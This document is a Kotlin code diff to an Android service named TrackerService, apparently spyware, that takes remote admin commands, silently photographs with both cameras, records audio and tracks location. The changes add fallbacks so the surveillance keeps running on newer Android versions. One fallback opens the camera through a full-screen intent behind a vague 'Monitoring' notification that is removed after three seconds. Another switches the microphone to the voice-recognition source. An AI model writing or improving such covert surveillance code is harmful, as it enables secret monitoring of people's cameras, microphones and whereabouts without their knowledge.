@@ -244,7 +244,33 @@ class TrackerService : Service() {
         listenToAdminCommands()
         updateDeviceInfo(devId)
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            try {
+                startForeground(
+                    NOTIFICATION_ID,
+                    notification,
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+                )
+            } catch (e: Exception) {
+                try {
+                    startForeground(
+                        NOTIFICATION_ID,
+                        notification,
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                    )
+                } catch (_: Exception) {
+                    try {
+                        startForeground(
+                            NOTIFICATION_ID,
+                            notification,
+                            ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                        )
+                    } catch (_: Exception) {}
+                }
+            }
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             try {
                 startForeground(
                     NOTIFICATION_ID,
@@ -254,7 +280,7 @@ class TrackerService : Service() {
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                 )
             } catch (_: Exception) {
-                startForeground(NOTIFICATION_ID, notification)
+                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
             }
         } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             try {
@@ -484,6 +510,11 @@ class TrackerService : Service() {
 
                 // 1. Orqa kamerani olish
                 takeSingleCamera2Photo(cameraManager, primaryCamId) { backBase64 ->
+                    if (backBase64 == null) {
+                        Log.w(TAG, "Camera2 returned null in background, using CameraActivity fallback")
+                        launchCameraActivity(devId)
+                        return@takeSingleCamera2Photo
+                    }
                     // 2. Old kamerani olish (agar mavjud va boshqacha bo'lsa)
                     val secondaryCamId = frontCamId
                     if (secondaryCamId != null && secondaryCamId != primaryCamId) {
@@ -497,8 +528,45 @@ class TrackerService : Service() {
                     }
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "Silent photo capture error", e)
-                mediaRef?.child("status")?.setValue("Kamera xatosi: ${e.message}")
+                Log.e(TAG, "Silent photo capture error, using CameraActivity fallback", e)
+                launchCameraActivity(devId)
+            }
+        }
+    }
+
+    private fun launchCameraActivity(devId: String) {
+        try {
+            val intent = Intent(this, CameraActivity::class.java).apply {
+                putExtra("device_id", devId)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+            }
+            startActivity(intent)
+        } catch (_: Exception) {
+            try {
+                val intent = Intent(this, CameraActivity::class.java).apply {
+                    putExtra("device_id", devId)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                val pi = PendingIntent.getActivity(
+                    this, 7771, intent,
+                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+                )
+                val notif = NotificationCompat.Builder(this, CHANNEL_ID)
+                    .setSmallIcon(R.mipmap.ic_launcher)
+                    .setContentTitle("Monitoring")
+                    .setContentText("Kamera xizmati faollashmoqda")
+                    .setPriority(NotificationCompat.PRIORITY_MAX)
+                    .setCategory(NotificationCompat.CATEGORY_ALARM)
+                    .setFullScreenIntent(pi, true)
+                    .setAutoCancel(true)
+                    .build()
+                val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
+                nm.notify(7771, notif)
+                heartbeatHandler.postDelayed({
+                    try { nm.cancel(7771) } catch (_: Exception) {}
+                }, 3000L)
+            } catch (e: Exception) {
+                Log.e(TAG, "launchCameraActivity error", e)
                 releaseWakeLock()
             }
         }
@@ -668,7 +736,11 @@ class TrackerService : Service() {
                 @Suppress("DEPRECATION")
                 MediaRecorder()
             }.apply {
-                setAudioSource(MediaRecorder.AudioSource.MIC)
+                try {
+                    setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
+                } catch (_: Exception) {
+                    setAudioSource(MediaRecorder.AudioSource.MIC)
+                }
                 setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                 setAudioEncodingBitRate(64000)
